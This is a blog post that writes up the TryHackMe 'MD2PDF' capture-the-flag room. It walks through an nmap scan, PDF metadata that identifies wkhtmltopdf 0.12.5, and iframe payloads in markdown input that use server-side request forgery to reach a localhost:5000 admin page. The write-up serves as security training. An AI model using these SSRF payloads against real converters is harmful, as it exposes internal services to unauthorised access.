<!DOCTYPE html><html lang="en-gb"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>TryHackMe | MD2PDF | CTF Writeup - sakibulalikhan</title><meta name="description" content="MD2PDF 🚀 TopTierConversions LTD is proud to present its latest product launch. This easy-to-use utility converts markdown files to PDF and is totally secure! Right…? Difficulty&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><link rel="stylesheet" href="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-black.css"><link rel="canonical" href="https://sakibulalikhan.pages.dev/tryhackme-or-md2pdf-or-ctf-writeup.html"><link rel="alternate" type="application/atom+xml" href="https://sakibulalikhan.pages.dev/feed.xml"><link rel="alternate" type="application/json" href="https://sakibulalikhan.pages.dev/feed.json"><meta property="og:title" content="TryHackMe | MD2PDF | CTF Writeup"><meta property="og:image" content="https://sakibulalikhan.pages.dev/media/posts/4/TryHackMe-MD2PDF.jpg"><meta property="og:image:width" content="474"><meta property="og:image:height" content="266"><meta property="og:site_name" content="sakibulalikhan"><meta property="og:description" content="MD2PDF 🚀 TopTierConversions LTD is proud to present its latest product launch. This easy-to-use utility converts markdown files to PDF and is totally secure! Right…? Difficulty&hellip;"><meta property="og:url" content="https://sakibulalikhan.pages.dev/tryhackme-or-md2pdf-or-ctf-writeup.html"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@sakibulalikhan"><meta name="twitter:title" content="TryHackMe | MD2PDF | CTF Writeup"><meta name="twitter:description" content="MD2PDF 🚀 TopTierConversions LTD is proud to present its latest product launch. This easy-to-use utility converts markdown files to PDF and is totally secure! Right…? Difficulty&hellip;"><meta name="twitter:image" content="https://sakibulalikhan.pages.dev/media/posts/4/TryHackMe-MD2PDF.jpg"><link rel="shortcut icon" href="https://sakibulalikhan.pages.dev/media/website/pen-tux.png" type="image/png"><link rel="preload" href="https://sakibulalikhan.pages.dev/assets/dynamic/fonts/jetbrainsmono/jetbrainsmono.woff2" as="font" type="font/woff2" crossorigin><link rel="stylesheet" href="https://sakibulalikhan.pages.dev/assets/css/style.css?v=909ddf073eaa5a8d6d5cd55e49a7aa95"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://sakibulalikhan.pages.dev/tryhackme-or-md2pdf-or-ctf-writeup.html"},"headline":"TryHackMe | MD2PDF | CTF Writeup","datePublished":"2024-01-07T10:37","dateModified":"2024-01-07T10:37","image":{"@type":"ImageObject","url":"https://sakibulalikhan.pages.dev/media/posts/4/TryHackMe-MD2PDF.jpg","height":266,"width":474},"description":"MD2PDF 🚀 TopTierConversions LTD is proud to present its latest product launch. This easy-to-use utility converts markdown files to PDF and is totally secure! Right…? Difficulty&hellip;","author":{"@type":"Person","name":"Sakibul Ali Khan","url":"https://sakibulalikhan.pages.dev/authors/sakibul-ali-khan/"},"publisher":{"@type":"Organization","name":"Sakibul Ali Khan","logo":{"@type":"ImageObject","url":"https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png","height":500,"width":500}}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript></head><body><div class="container container--center"><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="sakibulalikhan" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script><script defer="defer" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token": "22757d4facf2459dbb19685ef5c4bae1"}'></script><header class="header"><div class="header__logo"><a class="logo" href="https://sakibulalikhan.pages.dev/"><img src="https://sakibulalikhan.pages.dev/media/website/pen-tux-2.png" alt="sakibulalikhan" width="500" height="500"></a></div><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://sakibulalikhan.pages.dev/" target="_self">Home</a></li><li><a href="https://sakibulalikhan.pages.dev/tags/ctf-writeups/" target="_self">CTF Writeups</a></li><li><a href="https://sakibulalikhan.pages.dev/about.html" target="_self">About</a></li><li><a href="https://sakibulalikhan.pages.dev/contact.html" target="_self">Contact</a></li></ul></nav></header><main class="content"><article class="post"><header><h1 class="post__title">TryHackMe | MD2PDF | CTF Writeup</h1><div class="post__meta"><time datetime="2024-01-07T10:37" class="post__date">Jan 7, 2024 </time><span class="post__author"><a href="https://sakibulalikhan.pages.dev/authors/sakibul-ali-khan/" class="feed__author">Sakibul Ali Khan</a></span></div><div class="post__tags"><a href="https://sakibulalikhan.pages.dev/tags/ctf-writeups/" class="invert">CTF Writeups</a> <a href="https://sakibulalikhan.pages.dev/tags/tryhackme/" class="invert">TryHackMe</a> <a href="https://sakibulalikhan.pages.dev/tags/web-security/" class="invert">Web Security</a></div></header><figure class="post__image post__cover"><img src="https://sakibulalikhan.pages.dev/media/posts/4/TryHackMe-MD2PDF.jpg" srcset="https://sakibulalikhan.pages.dev/media/posts/4/responsive/TryHackMe-MD2PDF-xs.jpg 300w, https://sakibulalikhan.pages.dev/media/posts/4/responsive/TryHackMe-MD2PDF-sm.jpg 480w, https://sakibulalikhan.pages.dev/media/posts/4/responsive/TryHackMe-MD2PDF-md.jpg 768w, https://sakibulalikhan.pages.dev/media/posts/4/responsive/TryHackMe-MD2PDF-lg.jpg 1024w" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" loading="eager" height="266" width="474" alt=""></figure><div class="post__entry"><p id="1a74" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">MD2PDF</strong> 🚀 TopTierConversions LTD is proud to present its latest product launch. This easy-to-use utility converts markdown files to PDF and is totally secure! Right…?</p><p id="838c" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj"><strong>Difficulty =</strong> Easy</p><p id="0d0c" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Challenges:</strong> PDF, Markdown, SSRF.</p><p id="3dbc" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Beginning we start with Nmap scan. For scan we use ‘-sV’ flag to know about services &amp; versions. And we also use ‘-Pn’ flag to not ping to the server.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="2d3f" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-meta">@kali</span>:<span class="hljs-operator">~/</span>ctf$ sudo nmap <span class="hljs-operator">-</span>sV <span class="hljs-operator">-</span><span class="hljs-type">Pn</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">39.142</span><br><span class="hljs-type">Host</span> <span class="hljs-keyword">is</span> up (<span class="hljs-number">0</span>.19s latency).<br><span class="hljs-type">Not</span> shown: <span class="hljs-number">997</span> closed tcp ports (reset)<br><span class="hljs-type">PORT</span> <span class="hljs-type">STATE</span> <span class="hljs-type">SERVICE</span> <span class="hljs-type">VERSION</span><br><span class="hljs-number">22</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span> ssh <span class="hljs-type">OpenSSH</span> <span class="hljs-number">8</span>.2p1 <span class="hljs-type">Ubuntu</span> 4ubuntu0.<span class="hljs-number">5</span> (<span class="hljs-type">Ubuntu</span> <span class="hljs-type">Linux</span>; <span class="hljs-keyword">protocol</span> <span class="hljs-number">2.0</span>)<br><span class="hljs-number">80</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span> rtsp<br><span class="hljs-number">5000</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span> rtsp</span></pre><p id="0245" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">It looks like there are 3 services running on the machine, the standard HTTP server on port 80, an SSH server and another HTTP server on port 5000. The host also appears to be running some version of Ubuntu Server.</p><p id="de9c" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Let’s checking the web server on port 80 shows that it converts markdown file to pdf.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anx"><figure class="bg yx yy c"><figure class="is-loaded"><img src="https://miro.medium.com/v2/resize:fit:700/1*qLZ7jXKtWTsaqrzO9Kklvw.png" alt="TryHackMe MD2PDF Writeup" width="700" height="293" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure></div></div></figure><p id="dda0" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Here if i include any markdown code it will be converted to pdf.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km any"><figure class="bg yx yy c"><figure class="is-loaded"><img src="https://miro.medium.com/v2/resize:fit:700/1*MQ2gFGX98BxCS3CGdB2oCg.png" alt="TryHackMe MD2PDF writeup" width="700" height="269" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure></div></div></figure><p id="fc2c" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">If I click on ‘Convert to PDF’ button then it’ll convert our Markdown code in PDF file.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anp"><figure class="bg yx yy c"><figure class="is-loaded"><img src="https://miro.medium.com/v2/resize:fit:700/1*ZUzToTLxj9JCTW1RtyqypQ.png" alt="TryHackMe MD2PDF writeup" width="700" height="259" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure></div></div></figure><p id="88c7" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we’ll download the generated PDF file to check out the metadata.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="e2ba" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-string">sak@kali:~/ctf$</span> <span class="hljs-string">file</span> <span class="hljs-string">document.pdf</span><br><span class="hljs-attr">document.pdf:</span> <span class="hljs-string">PDF</span> <span class="hljs-string">document,</span> <span class="hljs-string">version</span> <span class="hljs-number">1.4</span><span class="hljs-string">,</span> <span class="hljs-number">0</span> <span class="hljs-string">pages</span><br><span class="hljs-string">sak@kali:~/ctf$</span> <span class="hljs-string">exiftool</span> <span class="hljs-string">document.pdf</span><br><span class="hljs-attr">ExifTool Version Number         :</span> <span class="hljs-number">12.55</span><br><span class="hljs-attr">File Name                       :</span> <span class="hljs-string">document.pdf</span><br><span class="hljs-attr">Directory                       :</span> <span class="hljs-string">.</span><br><span class="hljs-attr">File Size                       :</span> <span class="hljs-number">7.4</span> <span class="hljs-string">kB</span><br><span class="hljs-attr">File Modification Date/Time     :</span> <span class="hljs-number">2023</span><span class="hljs-string">:02:20</span> <span class="hljs-number">06</span><span class="hljs-string">:48:03+06:00</span><br><span class="hljs-attr">File Access Date/Time           :</span> <span class="hljs-number">2023</span><span class="hljs-string">:02:20</span> <span class="hljs-number">20</span><span class="hljs-string">:53:48+06:00</span><br><span class="hljs-attr">File Inode Change Date/Time     :</span> <span class="hljs-number">2023</span><span class="hljs-string">:02:20</span> <span class="hljs-number">20</span><span class="hljs-string">:51:33+06:00</span><br><span class="hljs-attr">File Permissions                :</span> <span class="hljs-string">-rw-rw-r--</span><br><span class="hljs-attr">File Type                       :</span> <span class="hljs-string">PDF</span><br><span class="hljs-attr">File Type Extension             :</span> <span class="hljs-string">pdf</span><br><span class="hljs-attr">MIME Type                       :</span> <span class="hljs-string">application/pdf</span><br><span class="hljs-attr">PDF Version                     :</span> <span class="hljs-number">1.4</span><br><span class="hljs-attr">Linearized                      :</span> <span class="hljs-literal">No</span><br><span class="hljs-attr">Title                           :</span> <br><span class="hljs-attr">Creator                         :</span> <span class="hljs-string">wkhtmltopdf</span> <span class="hljs-number">0.12</span><span class="hljs-number">.5</span><br><span class="hljs-attr">Producer                        :</span> <span class="hljs-string">Qt</span> <span class="hljs-number">4.8</span><span class="hljs-number">.7</span><br><span class="hljs-attr">Create Date                     :</span> <span class="hljs-number">2023</span><span class="hljs-string">:02:20</span> <span class="hljs-number">00</span><span class="hljs-string">:36:44Z</span><br><span class="hljs-attr">Page Count                      :</span> <span class="hljs-number">1</span><br><span class="hljs-attr">Page Mode                       :</span> <span class="hljs-string">UseOutlines</span></span></pre><p id="d43c" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In here we see the creator name <code class="ff abm abn abo abp b">wkhtmltopdf 0.12.5</code> we’ll search on google to know if there’s publicly known exploit for it.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anz"><figure class="bg yx yy c"><figure class="is-loaded"><img src="https://miro.medium.com/v2/resize:fit:700/1*ZMwkdK6VRI1gnPgypxa1zw.png" alt="TryHackMe MD2PDF writeup" width="700" height="357" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure></div></div></figure><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anp"><figure class="bg yx yy c"><figure class="is-loaded"><img src="https://miro.medium.com/v2/resize:fit:700/1*FLeQ8hLjn_sGFML83rUyUw.png" alt="TryHackMe MD2PDF writeup" width="700" height="359" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure></div></div></figure><p id="6c8f" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After reading about the <a class="af rn" href="https://cyber-guy.gitbook.io/cyber-guys-blog/blogs/initial-access-via-pdf-file-silently" rel="noopener ugc nofollow" target="_blank">exploit</a> shows that we can use iframe tag and perform Server Side Request Forgery</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="8f25" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-title.class">Payload</span>: &lt;iframe src="http://localhost/" width="1000" height="2000"&gt;`</span></pre><p id="ead4" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we if we paste this payload to input section and submit on ‘Convert to PDF button. It’s actually not worked</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anp"><figure class="bg yx yy c"><figure class="is-loaded"><img src="https://miro.medium.com/v2/resize:fit:700/1*JDVQMlBq1k3ewvfT_lJG-A.png" alt="TryHackMe MD2PDF writeup" width="700" height="297" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure></div></div></figure><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anp"><figure class="bg yx yy c"><figure class="is-loaded"><img src="https://miro.medium.com/v2/resize:fit:700/1*VbRCo9BCm9S0zhRJLi9_iQ.png" alt="TryHackMe MD2PDF writeup" width="700" height="240" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure></div></div></figure><p id="735a" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we’ll run gobuster to find if there’s any interesting thing or directory.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km aoa"><figure class="bg yx yy c"><figure class="is-loaded"><img src="https://miro.medium.com/v2/resize:fit:700/1*0QGwpf2XoO_4PW4xVjPrSw.jpeg" alt="TryHackMe MD2PDF writeup" width="700" height="367" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure></div></div></figure><p id="c0ef" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We got an admin directory which when accessed gives 403.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anp"><figure class="bg yx yy c"><figure class="is-loaded"><img src="https://miro.medium.com/v2/resize:fit:700/1*U355yK93I5_hRbSQKVIwFw.png" alt="TryHackMe MD2PDF writeup" width="700" height="293" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure></div></div></figure><p id="44aa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">But we got an interesting massage that <strong class="ly kz">it only be seen internally (localhost:5000).</strong></p><p id="31e9" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we can use it as leverage the SSRF vulnerability and view the admin directory on port 5000.</p><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anp"><figure class="bg yx yy c"><figure class="is-loaded"><img src="https://miro.medium.com/v2/resize:fit:700/1*wjFmdtFBiB6hNEQjeYbJ1Q.png" alt="TryHackMe MD2PDF writeup" width="700" height="364" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure></div></div></figure><p id="05d0" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Copy this payload &amp; paste it. Then tap on the ‘Convert to PDF’ button.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="ff25" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-title.class">Payload</span>: &lt;iframe src="http://localhost:5000/admin" width="1000" height="2000"&gt;</span></pre><figure class="yq yr ys yt yu yv kl km paragraph-image"><div class="acf acg dj ach bg aci" tabindex="0" role="button"><div class="kl km anp"><figure class="bg yx yy c"><figure class="is-loaded"><img src="https://miro.medium.com/v2/resize:fit:700/1*WYsDb15y6dEfAQeiOrb11g.png" alt="TryHackMe MD2PDF writeup &amp; solve &amp; flag." width="700" height="270" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure></div></div></figure><p id="4131" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Bang……! We got our flag!!!!</p><p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p><p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>: <a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p><p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy MD2PDF~</strong></p></div><footer class="wrapper post__footer"><p class="post__last-updated">This article was updated on Jan 7, 2024</p><div class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-or-md2pdf-or-ctf-writeup.html" class="js-share invert facebook" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#facebook"/></svg> <span>Facebook</span> </a><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-or-md2pdf-or-ctf-writeup.html&amp;via=sakibulalikhan&amp;text=TryHackMe%20%7C%20MD2PDF%20%7C%20CTF%20Writeup" class="js-share invert twitter" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#twitter"/></svg> <span>Twitter</span> </a><a href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-or-md2pdf-or-ctf-writeup.html&amp;media=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fmedia%2Fposts%2F4%2FTryHackMe-MD2PDF.jpg&amp;description=TryHackMe%20%7C%20MD2PDF%20%7C%20CTF%20Writeup" class="js-share invert pinterest" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#pinterest"/></svg> <span>Pinterest</span> </a><a href="https://mix.com/add?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-or-md2pdf-or-ctf-writeup.html" class="js-share invert mix" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#mix"/></svg> <span>Mix</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-or-md2pdf-or-ctf-writeup.html" class="js-share invert linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=TryHackMe%20%7C%20MD2PDF%20%7C%20CTF%20Writeup&amp;url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-or-md2pdf-or-ctf-writeup.html" class="js-share invert buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=TryHackMe%20%7C%20MD2PDF%20%7C%20CTF%20Writeup https%3A%2F%2Fsakibulalikhan.pages.dev%2Ftryhackme-or-md2pdf-or-ctf-writeup.html" class="js-share invert whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></footer><nav class="pagination"><div class="pagination__title"><span>Read other posts</span></div><div class="pagination__buttons"><a href="https://sakibulalikhan.pages.dev/how-to-limit-battery-charging-set-a-charge-threshold-for-asus-laptops-on-linux.html" class="btn previous" rel="prev" aria-label="[MISSING TRANSLATION]:  How To Limit Battery Charging (Set A Charge Threshold) For ASUS Laptops On Linux "><span class="btn__icon">←</span> <span class="btn__text">How To Limit Battery Charging (Set A Charge Threshold) For ASUS Laptops On Linux</span> </a><a href="https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html" class="btn next" rel="next" aria-label="[MISSING TRANSLATION]:  Bugged Tryhackme CTF Writeup "><span class="btn__text">Bugged Tryhackme CTF Writeup</span> <span class="btn__icon">→</span></a></div></nav></article><div class="post__comments"><div class="comments"><div class="comments-wrapper"><h2>Comments</h2><div id="disqus_thread"></div><noscript>Please enable JS to use the comments form.</noscript><script type="text/javascript">var disqus_config = function () {
							this.page.url = 'https://sakibulalikhan.pages.dev/tryhackme-or-md2pdf-or-ctf-writeup.html';
							this.page.identifier = '4'; 
							this.language = 'en_GB';
						};
						
						
				var disqus_element_to_check = document.getElementById('disqus_thread');

				if ('IntersectionObserver' in window) {
					var iObserver = new IntersectionObserver(
						(entries, observer) => {
							entries.forEach(entry => {
								if (entry.intersectionRatio >= 0.1) {
									(function () {
										var d = document, s = d.createElement('script');
										s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
										s.setAttribute('data-timestamp', +new Date());
										(d.head || d.body).appendChild(s);
									})();
									observer.unobserve(entry.target);
								}
							});
						},
						{
							threshold: [0, 0.2, 0.5, 1]
						}
					);

					iObserver.observe(disqus_element_to_check);
				} else {
					(function () {
						var d = document, s = d.createElement('script');
						s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
						s.setAttribute('data-timestamp', +new Date());
						(d.head || d.body).appendChild(s);
					})();
				}</script><script type="text/javascript"></script></div></div></div></main><footer class="footer"><div class="footer__inner"><div class="footer__copyright"><p>Sakibul Ali Khan • © 2024 • Offens!ve Blogs</p></div><div class="footer__social"><a href="https://twitter.com/sakibulalikhan" aria-label="Twitter"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#twitter"/></svg> </a><a href="https://www.linkedin.com/in/sakibulalikhan/" aria-label="LinkedIn"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#linkedin"/></svg> </a><a href="https://www.youtube.com/@sakibulalikhan" aria-label="Youtube"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#youtube"/></svg></a></div></div></footer></div><script defer="defer" src="https://sakibulalikhan.pages.dev/assets/js/scripts.min.js?v=74fad06980c30243d91d72c7c57fcdb8"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-line-numbers.min.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/clipboard.min.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-copy-to-clipboard.min.js"></script><div class="pcb" data-behaviour="badge" data-behaviour-link="#cookie-settings" data-revision="1" data-config-ttl="90" data-debug-mode="false"><div role="dialog" aria-modal="true" aria-hidden="true" aria-labelledby="pcb-title" aria-describedby="pcb-txt" class="pcb__banner pcb__banner--left"><div class="pcb__inner"><div id="pcb-title" role="heading" aria-level="2" class="pcb__title">Cookies</div><div id="pcb-txt" class="pcb__txt">This website uses cookies to ensure you get the best experience on our site.</div><div class="pcb__buttons"><button type="button" class="pcb__btn pcb__btn--solid pcb__btn--accept">Accept</button></div></div></div><button class="pcb__badge" aria-label="Cookie Policy" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" width="40" height="40" viewBox="0 0 23 23" fill="currentColor"><path d="M21.41 12.71c-.08-.01-.15 0-.22 0h-.03c-.03 0-.05 0-.08.01-.07 0-.13.01-.19.04-.52.21-1.44.19-2.02-.22-.44-.31-.65-.83-.62-1.53a.758.758 0 0 0-.27-.61.73.73 0 0 0-.65-.14c-1.98.51-3.49.23-4.26-.78-.82-1.08-.73-2.89.24-4.49.14-.23.14-.52 0-.75a.756.756 0 0 0-.67-.36c-.64.03-1.11-.1-1.31-.35-.19-.26-.13-.71-.01-1.29.04-.18.06-.38.03-.59-.05-.4-.4-.7-.81-.66C5.1 1.54 1 6.04 1 11.48 1 17.28 5.75 22 11.6 22c5.02 0 9.39-3.54 10.39-8.42.08-.4-.18-.78-.58-.87Zm-9.81 7.82c-5.03 0-9.12-4.06-9.12-9.06 0-4.34 3.05-8 7.25-8.86-.08.7.05 1.33.42 1.81.24.32.66.67 1.38.84-.76 1.86-.65 3.78.36 5.11.61.81 2.03 2 4.95 1.51.18.96.71 1.54 1.18 1.87.62.43 1.38.62 2.1.62.05 0 .09 0 .13-.01-1.23 3.64-4.7 6.18-8.64 6.18ZM13 17c0 .55-.45 1-1 1s-1-.45-1-1 .45-1 1-1 1 .45 1 1Zm5.29-12.3a.99.99 0 0 1-.29-.71c0-.55.45-.99 1-.99a1 1 0 0 1 .71.3c.19.19.29.44.29.71 0 .55-.45.99-1 .99a1 1 0 0 1-.71-.3ZM9 13.5c0 .83-.67 1.5-1.5 1.5S6 14.33 6 13.5 6.67 12 7.5 12s1.5.67 1.5 1.5Zm3.25.81a.744.744 0 0 1-.06-1.05c.28-.32.75-.34 1.05-.06.31.28.33.75.05 1.06-.15.16-.35.25-.56.25-.18 0-.36-.06-.5-.19ZM8.68 7.26c.41.37.44 1 .07 1.41-.2.22-.47.33-.75.33a.96.96 0 0 1-.67-.26c-.41-.37-.44-1-.07-1.41.37-.42 1-.45 1.41-.08Zm11.48 1.88c.18-.19.52-.19.7 0 